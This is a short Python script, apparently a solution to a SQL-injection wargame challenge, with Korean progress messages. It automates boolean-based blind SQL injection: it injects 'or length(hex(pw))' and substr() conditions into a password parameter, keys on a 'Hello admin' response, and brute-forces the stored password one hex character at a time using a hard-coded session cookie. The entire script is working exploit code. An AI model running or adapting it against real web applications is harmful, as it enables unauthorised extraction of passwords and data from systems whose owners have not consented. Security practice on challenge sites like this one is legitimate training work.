import requests

cookies={'PHPSESSID':'u57bodsk09lrm987t3asr8shd8'}
length=23
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    address="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    url=address+"?pw= 'or length(hex(pw))="+str(length)+"%23"
    res=requests.get(url,cookies=cookies)
    length+=1

    if "Hello admin" in res.text:
        print("비밀번호 길이는??:"+str(length-1))
        break
    else:
        print(str(length)+"자리 아님")

i=length
pw=""
for a in range(1,i):
    for b in hex_value:
        url= address+"?pw=' or substr(hex(pw),"+str(a)+",1)='"+b+"'%23" 
        res=requests.get(url,cookies=cookies)

        if"<h2>Hello admin</h2>" in res.text:
            print(str(a)+"of pw----------->"+b)
            pw+=b
            break
        else:
            print(b +": X")
print(pw)
